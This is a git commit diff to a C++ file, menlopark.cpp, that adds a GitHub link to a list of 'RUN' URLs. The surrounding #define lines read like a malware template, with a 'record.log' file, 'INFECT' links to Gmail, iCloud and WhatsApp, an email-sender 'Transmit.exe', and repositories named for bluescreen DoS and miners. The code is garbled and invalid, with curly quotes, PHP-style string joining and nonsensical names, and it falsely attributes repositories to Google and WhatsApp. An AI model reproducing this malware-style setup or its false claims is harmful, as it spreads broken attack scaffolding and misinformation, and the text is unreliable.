c6953f511d5877f8b4788a38f5cd3cd7f01825cf
fadliwiryawirawan-cyberw1ry4 <274125455+Fadliwiryawirawan-development@users.noreply.github.com>
2026-06-09 18:22:10 +0700

    Update menlopark.cpp

--- menlopark.cpp
+++ menlopark.cpp
@@ -19,7 +19,7 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina ”
 #define RUN_FILE_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina”
-#define RUN_Link_NAME "https://github.com/whatsapp/enable/forks"."https://github.com/Google/menloparks/opensource/openssl/forks"."https://github.com/Google/menloparks/opensource/openSSH/forks"."https://github.com/Fadliwiryawirawan-development/Bluescreen-BsDoSs.exe/forks"."https://github.com/Google/opensource/download_minners/forks"."https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/cyrcle11/Google-2FA/forks"
+#define RUN_Link_NAME "https://github.com/Fadliwiryawirawan-development/cyberw1ry4/forks"."https://github.com/whatsapp/enable/forks"."https://github.com/Google/menloparks/opensource/openssl/forks"."https://github.com/Google/menloparks/opensource/openSSH/forks"."https://github.com/Fadliwiryawirawan-development/Bluescreen-BsDoSs.exe/forks"."https://github.com/Google/opensource/download_minners/forks"."https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/cyrcle11/Google-2FA/forks"
 #define INFECT_Link_NAME "https://workspace.google.com/intl/en-id/gmail/"."https://icloud.com/mail"."https://www.whatsapp.com/?lang=id"."https://www.ecosia.org"."https://www.google.com.cn"."https://www.google.com.lk"."https://www.tree.co.uk"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
